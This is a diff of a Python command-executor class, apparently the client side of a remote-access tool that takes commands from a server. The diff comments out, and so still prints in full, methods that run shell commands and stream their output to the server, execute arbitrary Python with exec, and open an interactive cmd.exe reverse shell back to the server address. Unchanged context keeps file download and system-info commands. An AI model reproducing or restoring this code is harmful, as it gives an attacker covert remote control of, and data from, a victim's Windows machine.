@@ -66,24 +66,24 @@ class CommandExecutor:
             # 如果不存在与解析出的名字相对应的方法，则执行 'shell' 方法并将原始命令作为参数
             return self.shell(command)
 
-    def read_stream(self, stream):
-        """
-        从输入流 stream 读取内容，并将每一行通过 send_to_server 方法发送到服务器。
-
-        Parameters:
-            stream (file-like object): 用于读取内容的输入流对象。
-
-        Returns:
-            None
-        """
-        while True:
-            # 从输入流读取一行数据
-            line = stream.readline()
-            # 如果没有更多数据可读取，则跳出循环
-            if not line:
-                break
-            # 将读取的字节转换为字符串，并去除行尾的换行符
-            self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
+    # def read_stream(self, stream):
+    #     """
+    #     从输入流 stream 读取内容，并将每一行通过 send_to_server 方法发送到服务器。
+    #
+    #     Parameters:
+    #         stream (file-like object): 用于读取内容的输入流对象。
+    #
+    #     Returns:
+    #         None
+    #     """
+    #     while True:
+    #         # 从输入流读取一行数据
+    #         line = stream.readline()
+    #         # 如果没有更多数据可读取，则跳出循环
+    #         if not line:
+    #             break
+    #         # 将读取的字节转换为字符串，并去除行尾的换行符
+    #         self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)
 
     def send_to_server(self, status, result, end):
         self.socket.send_response(self.command_id, status, result, end)
@@ -134,27 +134,21 @@ class CommandExecutor:
         else:
             return 1, ''
 
-    @desc('execute shell command and read from streams in parallel')
-    def read(self, command):
-        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                               stdin=subprocess.DEVNULL)
-        stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
-        stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
-        stdout_thread.daemon = True
-        stderr_thread.daemon = True
-        stdout_thread.start()
-        stderr_thread.start()
-        # 等待命令完成
-        cmd.wait()
-        time.sleep(0.1)
-        self.send_to_server(1, "Command completed successfully", 1)
+    # @desc('execute shell command and read from streams in parallel')
+    # def read(self, command):
+    #     cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    #                            stdin=subprocess.DEVNULL)
+    #     stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
+    #     stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
+    #     stdout_thread.daemon = True
+    #     stderr_thread.daemon = True
+    #     stdout_thread.start()
+    #     stderr_thread.start()
+    #     # 等待命令完成
+    #     cmd.wait()
+    #     time.sleep(0.1)
+    #     self.send_to_server(1, "Command completed successfully", 1)
 
-    @desc('execute shell command without waiting for results')
-    def run(self, command):
-        if not command:
-            return 0, ''
-        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
-        return 1, 'Process created: {}'.format(p.pid)
 
     @desc('download file')
     def download(self, filename):
@@ -165,25 +159,25 @@ class CommandExecutor:
         else:
             return 0, 'File does not exist'
 
-    @desc('execute python code')
-    def pyexec(self, code, kwargs=None):
-        if kwargs is None:
-            kwargs = {}
-        f = io.StringIO()
-        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
-            exec(code, kwargs)
-        return 1, f.getvalue()
+    # @desc('execute python code')
+    # def pyexec(self, code, kwargs=None):
+    #     if kwargs is None:
+    #         kwargs = {}
+    #     f = io.StringIO()
+    #     with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
+    #         exec(code, kwargs)
+    #     return 1, f.getvalue()
 
-    @desc('close connection')
-    def kill(self):
-        self.socket.close()
-        sys.exit(0)
-
-    @desc('reset connection')
-    def reset(self):
-        subprocess.Popen(EXECUTABLE_PATH)
-        self.socket.close()
-        sys.exit(0)
+    # @desc('close connection')
+    # def kill(self):
+    #     self.socket.close()
+    #     sys.exit(0)
+    #
+    # @desc('reset connection')
+    # def reset(self):
+    #     subprocess.Popen(EXECUTABLE_PATH)
+    #     self.socket.close()
+    #     sys.exit(0)
 
     @desc('show this help')
     def help(self):
@@ -192,24 +186,24 @@ class CommandExecutor:
                    if hasattr(method, 'help')}
         return 1, format_dict({name: method.help for name, method in methods.items()})
 
-    @desc('change directory')
-    def cd(self, path):
-        if not path:
-            return 1, ''
-        if os.path.isdir(path):
-            os.chdir(path)
-            return 1, ''
-        else:
-            return 0, 'Cannot find the path specified'
-
-    @desc('execute python code')
-    def pyexec(self, code, kwargs=None):
-        if kwargs is None:
-            kwargs = {}
-        f = io.StringIO()
-        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
-            exec(code, kwargs)
-        return 1, f.getvalue()
+    # @desc('change directory')
+    # def cd(self, path):
+    #     if not path:
+    #         return 1, ''
+    #     if os.path.isdir(path):
+    #         os.chdir(path)
+    #         return 1, ''
+    #     else:
+    #         return 0, 'Cannot find the path specified'
+    #
+    # @desc('execute python code')
+    # def pyexec(self, code, kwargs=None):
+    #     if kwargs is None:
+    #         kwargs = {}
+    #     f = io.StringIO()
+    #     with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
+    #         exec(code, kwargs)
+    #     return 1, f.getvalue()
 
 
 
@@ -259,32 +253,32 @@ class CommandExecutor:
         else:
             return 0, 'The module has not been imported'
 
-    @desc('start a interactive reverse shell')
-    def revshell(self, arg):
-        self.send_to_server(1, 'Reverse shell thread being started', 1)
-
-        p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-
-        s = socket.socket()
-        s.connect((SERVER_ADDR[0], int(arg.strip())))
-
-        def send():
-            while p.poll() is None:
-                o = os.read(p.stdout.fileno(), 1024)
-                s.send(o)
-            logger.info('Sending thread has been terminated')
-            s.close()
-
-        def recv():
-            try:
-                while 1:
-                    i = s.recv(1024)
-                    os.write(p.stdin.fileno(), i)
-            finally:
-                logger.info('Receiving thread has been terminated')
-
-        threading.Thread(target=send, daemon=True).start()
-        threading.Thread(target=recv).start()
+    # @desc('start a interactive reverse shell')
+    # def reverse_shell(self, arg):
+    #     self.send_to_server(1, 'Reverse shell thread being started', 1)
+    #
+    #     p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    #
+    #     s = socket.socket()
+    #     s.connect((SERVER_ADDR[0], int(arg.strip())))
+    #
+    #     def send():
+    #         while p.poll() is None:
+    #             o = os.read(p.stdout.fileno(), 1024)
+    #             s.send(o)
+    #         logger.info('Sending thread has been terminated')
+    #         s.close()
+    #
+    #     def recv():
+    #         try:
+    #             while 1:
+    #                 i = s.recv(1024)
+    #                 os.write(p.stdin.fileno(), i)
+    #         finally:
+    #             logger.info('Receiving thread has been terminated')
+    #
+    #     threading.Thread(target=send, daemon=True).start()
+    #     threading.Thread(target=recv).start()
 
     @desc('get information')
     def getinfo(self):
